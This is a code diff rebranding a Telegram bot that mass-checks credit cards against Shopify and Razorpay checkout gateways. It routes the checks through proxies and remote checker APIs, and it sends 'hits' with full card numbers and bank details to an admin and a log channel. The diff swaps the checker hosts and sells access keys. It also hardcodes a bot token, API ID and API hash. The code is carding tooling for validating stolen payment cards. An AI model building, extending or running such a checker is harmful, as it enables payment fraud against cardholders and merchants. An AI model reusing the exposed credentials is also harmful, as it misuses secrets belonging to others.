@@ -19,7 +19,10 @@ import urllib.parse
 
 # ===================== MULTIPLE SHOPIFY APIS =====================
 SHOPIFY_APIS = [
-    "https://nemesisshopify-production-807f.up.railway.app/shopify",
+    
+    'https://afunx-0cece6049c30.herokuapp.com/shopify',
+    'https://afuona-2e2060d202b7.herokuapp.com/shopify',
+    'https://afuonax-757112f9aa0f.herokuapp.com/shopify'
 ]
 
 def get_api():
@@ -28,11 +31,11 @@ def get_api():
 # Bot Configuration
 API_ID ='21124241' 
 API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
-BOT_TOKEN = '8640129584:AAHONUWjpPCDOq_rGrDr5QKZt0sL8voPvas'
-ADMIN_ID = 1624840921
-KEY_ADMINS = {6124760730,8640129584}
+BOT_TOKEN = '8692522690:AAHwKhCs7VgnRNwchV1a-pwip09HFNEmPH4'
+ADMIN_ID = 6124760730
+KEY_ADMINS = {6124760730}
 
-CHANNEL_USERNAME = "foritshopi"
+CHANNEL_USERNAME = "@Myselfshopibot"
 
 # File paths
 PREMIUM_FILE = 'premium.txt'
@@ -632,7 +635,7 @@ def kb_copy(card: str) -> list:
 
 # ===================== BOT LINK BUTTON =====================
 def kb_bot_link():
-    return [[Button.url("◢◤◢◤𝐅𝐎𝐑 𝐈𝐓◤◢◤◢", "https://t.me/foritxshopi_bot")]]
+    return [[Button.url("◢◤◢◤SHOPI◤◢◤◢", "https://t.me/Myselfshopibot")]]
 
 # ===================== MASS CHECK SHOPIFY =====================
 async def run_mass_shopify(uid: int, msg: object, cards: list, sites: list, proxies: list, from_user=None):
@@ -738,7 +741,7 @@ async def update_progress(user_id, message_id, results, current_attempt_count, f
     elapsed_str = f"{m}m{s:02d}s" if m else f"{s}s"
     cps_str = f"{cps:.1f}" if cps >= 0.1 else "—"
 
-    text = f"""<b>⚡ ◢◤◢◤𝐅𝐎𝐑 𝐈𝐓◤◢◤◢ ⚡</b>
+    text = f"""<b>⚡ ◢◤◢◤SHOPI◤◢◤◢ ⚡</b>
 ━━━━━━━━━━━━━━━━━━━━
 <b>💥 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ {gateway}</b>
 <b>🔄 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...</b>
@@ -915,7 +918,7 @@ async def send_hit_to_admin(result, user_id, hit_type):
             me = await bot.get_me()
             bot_username = f"<a href='tg://user?id={me.id}'>{me.first_name or 'Bot'}</a>"
         except:
-            bot_username = "<a href='tg://user?id=8823705089'>◢◤◢◤𝐅𝐎𝐑 𝐈𝐓◤◢◤◢</a>"
+            bot_username = "<a href='tg://user?id=6124760730'>◢◤◢◤SHOPI◤◢◤◢</a>"
         is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
         currency_symbol = "₹" if is_razorpay else ""
         admin_msg = f"""[❆] {status_text}
@@ -930,7 +933,7 @@ Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
 ⏱ ➳ {current_time}
 🔗 ➳ <a href="tg://user?id={user_id}">{first_name}</a> [{plan}]
 🤩 ➳ {bot_username}"""
-        admin_id = 8823705089
+        admin_id = 6124760730
         await bot.send_message(admin_id, premium_emoji(admin_msg), parse_mode='html')
     except Exception as e:
         print(f"send_hit_to_admin error: {e}")
@@ -975,11 +978,11 @@ async def send_realtime_hit_group(user_id, result, hit_type, username):
 RES✅ → <code>{response_msg}</code>
 𝗨𝗦𝗘𝗥 → <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""
         buttons = [
-            [Button.url("◢◤◢◤𝐅𝐎𝐑 𝐈𝐓◤◢◤◢", url="https://t.me/foritxshopi_bot", style="primary")]
+            [Button.url("◢◤◢◤SHOPI◤◢◤◢", url="https://t.me/Myselfshopibot", style="primary")]
         ]
         try:
-            msg = await bot.send_message("foritgc", premium_emoji(message), parse_mode='html', buttons=buttons, silent=True)
-            await bot.send_reaction("foritgc", msg.id, "💎")
+            msg = await bot.send_message("Shopi Logs", premium_emoji(message), parse_mode='html', buttons=buttons, silent=True)
+            await bot.send_reaction("Shopi Logs", msg.id, "💎")
         except:
             pass
         try:
@@ -1019,7 +1022,7 @@ async def send_realtime_hit_dm(user_id, result, hit_type, username):
             me = await bot.get_me()
             bot_username = f"<a href='tg://user?id={me.id}'>{me.first_name or 'Bot'}</a>"
         except:
-            bot_username = "<a href='tg://user?id=8823705089'>◢◤◢◤𝐅𝐎𝐑 𝐈𝐓◤◢◤◢</a>"
+            bot_username = "<a href='tg://user?id=6124760730'>◢◤◢◤SHOPI◤◢◤◢</a>"
         hit_caption = f"""[❆] {status_text}
 💳
    ⤷ <code>{result['card']}</code>
@@ -2462,7 +2465,7 @@ async def generate_key_cmd(event):
         for i, key in enumerate(keys, 1):
             await f.write(f"{i}. {key}\n")
         await f.write("\n" + "=" * 30 + "\n")
-        await f.write("Bot: @foritxshopi_bot\n")
+        await f.write("Bot: @Myselfshopibot\n")
         await f.write("Redeem: /redeem [key]\n")
     msg = f"""<b>𝗞𝗲𝘆𝘀 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱</b>  ✅
 ━━━━━━━━━━━━━━━━━
@@ -2476,7 +2479,7 @@ async def generate_key_cmd(event):
         msg += f"\n{i}. <code>{key}</code>"
     msg += f"""
 ━━━━━━━━━━━━━━━━━
-⚡ <b>Bot :</b> @foritxshopi_bot
+⚡ <b>Bot :</b> @Myselfshopibot
 ✅ <b>Redeem :</b> <code>/redeem [key]</code>"""
     await bot.send_message(event.chat_id, premium_emoji(msg), file=filename, parse_mode="html")
     try: os.remove(filename)
@@ -2578,7 +2581,7 @@ async def redeem_cmd(event):
 ━━━━━━━━━━━━━━━━━━━━
 💎 <b>ᴀᴀᴘᴋᴀ ᴘʀᴇᴍɪᴜᴍ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴇ ʜᴀɪ!</b>
 📊 <b>ᴄʜᴇᴄᴋ:</b> <code>/plan</code>
-👑 <b>ᴄᴏɴᴛᴀᴄᴛ:</b> <a href="tg://user?id=8823705089">@ook83</a></b>"""), parse_mode="html")
+👑 <b>ᴄᴏɴᴛᴀᴄᴛ:</b> <a href="tg://user?id=6124760730">@ook83</a></b>"""), parse_mode="html")
     elif result == "device_limit_reached":
         try:
             await processing_msg.delete()
@@ -2593,7 +2596,7 @@ async def redeem_cmd(event):
 👥 <b>ᴀʟʟ {device_limit} sʟᴏᴛs ᴜsᴇᴅ!</b>
 ━━━━━━━━━━━━━━━━━━━━
 💡 <b>ꜰʀᴇsʜ ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ:</b>
-👑 <a href="tg://user?id=8823705089">@ook83</a></b>"""), parse_mode="html")
+👑 <a href="tg://user?id=6124760730">@ook83</a></b>"""), parse_mode="html")
     elif result == "used":
         try:
             await processing_msg.delete()
@@ -2603,7 +2606,7 @@ async def redeem_cmd(event):
 ━━━━━━━━━━━━━━━━━━━━
 🔑 <b>ᴀᴀᴘ ʏᴇʜ ᴋᴇʏ ᴘᴇʜʟᴇ sᴇ ᴜsᴇ ᴋᴀʀ ᴄʜᴜᴋᴇ ʜᴏ!</b>
 ━━━━━━━━━━━━━━━━━━━━
-👑 <b>ᴄᴏɴᴛᴀᴄᴛ:</b> <a href="tg://user?id=8823705089">@ook83</a></b>
+👑 <b>ᴄᴏɴᴛᴀᴄᴛ:</b> <a href="tg://user?id=6124760730">@ook83</a></b>
 📅 <b>ᴘʟᴀɴs: ₹200/ᴡᴇᴇᴋ | ₹500/ᴍᴏɴᴛʜ</b>"""), parse_mode="html")
     else:
         try:
@@ -2618,7 +2621,7 @@ async def redeem_cmd(event):
 ✅ ᴋᴇʏ ᴇxᴘɪʀᴇ ᴛᴏ ɴᴀʜɪ?
 ✅ ᴅᴇᴠɪᴄᴇ ʟɪᴍɪᴛ ꜰᴜʟʟ?
 ━━━━━━━━━━━━━━━━━━━━
-👑 <b>ꜰʀᴇsʜ ᴋᴇʏ:</b> <a href="tg://user?id=8823705089">@ook83</a></b>
+👑 <b>ꜰʀᴇsʜ ᴋᴇʏ:</b> <a href="tg://user?id=6124760730">@ook83</a></b>
 📅 <b>ᴘʟᴀɴs: ₹200/ᴡᴇᴇᴋ | ₹500/ᴍᴏɴᴛʜ</b>"""), parse_mode="html")
 
 # ---- /plan ----
@@ -2701,7 +2704,7 @@ async def plan_cmd(event):
 🔑 <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b>
 ᴜsᴇ <code>/redeem KEY_HERE</code> ꜰᴏʀ ɪɴsᴛᴀɴᴛ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ
 🔄 <b>ɢᴇᴛ ᴘʀᴇᴍɪᴜᴍ</b>
-ᴄᴏɴᴛᴀᴄᴛ <a href="tg://user?id=8823705089">@ook83</a> ꜰᴏʀ ᴋᴇʏs
+ᴄᴏɴᴛᴀᴄᴛ <a href="tg://user?id=6124760730">@ook83</a> ꜰᴏʀ ᴋᴇʏs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 🤖 <b>ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰᴏʀ ɪᴛ</b>"""
     await event.reply(premium_emoji(msg), parse_mode='html')
@@ -2768,7 +2771,7 @@ async def start(event):
 <b>⚠️ ᴅᴏɴᴏ ᴄʜᴀɴɴᴇʟ ᴊᴏɪɴ ᴋᴀʀᴏ ꜰɪʀ ᴠᴇʀɪꜰʏ ᴋᴀʀᴏ!</b>"""
         join_buttons = [
             [Button.url("🔗 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 1", f"https://t.me/{CHANNEL_USERNAME}", style="primary")],
-            [Button.url("🔗 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 2", "https://t.me/foritgc", style="primary")],
+            [Button.url("🔗 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 2", "https://t.me/+nDTSPWA3qQ40OWE0", style="primary")],
             [Button.inline("✅ ᴠᴇʀɪꜰʏ", b"verify", style="success")],
         ]
         await bot.send_file(event.chat_id, file=PHOTO_URL, caption=premium_emoji(join_msg), buttons=join_buttons, parse_mode="html", force_document=False)
